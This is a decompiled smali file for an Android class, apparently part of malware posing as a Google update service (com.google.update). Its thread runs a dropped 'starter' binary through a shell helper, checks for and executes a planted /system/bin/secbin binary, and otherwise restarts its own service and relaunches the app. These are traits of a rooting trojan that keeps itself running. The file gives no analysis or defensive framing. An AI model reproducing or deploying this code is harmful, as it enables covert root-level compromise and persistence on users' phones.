.class Lcom/google/update/UpdateService$MyThread;
.super Ljava/lang/Thread;
.source "UpdateService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/google/update/UpdateService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "MyThread"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/google/update/UpdateService;


# direct methods
.method constructor <init>(Lcom/google/update/UpdateService;)V
    .locals 0

    .prologue
    .line 48
    iput-object p1, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    .prologue
    const-string v7, "/system/bin/secbin"

    const-string v6, ""

    .line 50
    iget-object v4, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    invoke-virtual {v4}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    .line 51
    .local v0, "ai":Landroid/content/pm/ApplicationInfo;
    new-instance v4, Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    # invokes: Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;
    invoke-static {v5}, Lcom/google/update/UpdateService;->access$0(Lcom/google/update/UpdateService;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "starter"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, " /data/data/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    invoke-static {v4, v6}, Lcom/google/update/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 53
    const-wide/16 v4, 0x1388

    :try_start_0
    invoke-static {v4, v5}, Lcom/google/update/UpdateService$MyThread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 56
    :goto_0
    new-instance v4, Ljava/io/File;

    const-string v5, "/system/bin/secbin"

    invoke-direct {v4, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 57
    const-string v4, "/system/bin/secbin"

    const-string v4, ""

    invoke-static {v7, v6}, Lcom/google/update/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 58
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v4

    invoke-static {v4}, Landroid/os/Process;->killProcess(I)V

    .line 72
    :goto_1
    return-void

    .line 60
    :cond_0
    const-string v4, "am"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "startservice -n "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "com.google.update.UpdateService"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lcom/google/update/Utils;->runsh(Ljava/lang/String;Ljava/lang/String;)V

    .line 62
    iget-object v4, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    invoke-virtual {v4}, Lcom/google/update/UpdateService;->getBaseContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 63
    .local v2, "pkgManager":Landroid/content/pm/PackageManager;
    iget-object v4, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    invoke-virtual {v4}, Lcom/google/update/UpdateService;->getBaseContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    .line 65
    .local v3, "str":Ljava/lang/String;
    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 66
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x8000000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 67
    const/high16 v4, 0x400000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 68
    const/high16 v4, 0x10000

    invoke-virtual {v1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 69
    iget-object v4, p0, Lcom/google/update/UpdateService$MyThread;->this$0:Lcom/google/update/UpdateService;

    invoke-virtual {v4, v1}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    .line 70
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v4

    invoke-static {v4}, Landroid/os/Process;->killProcess(I)V

    goto :goto_1

    .line 54
    .end local v1    # "intent":Landroid/content/Intent;
    .end local v2    # "pkgManager":Landroid/content/pm/PackageManager;
    .end local v3    # "str":Ljava/lang/String;
    :catch_0
    move-exception v4

    goto :goto_0
.end method
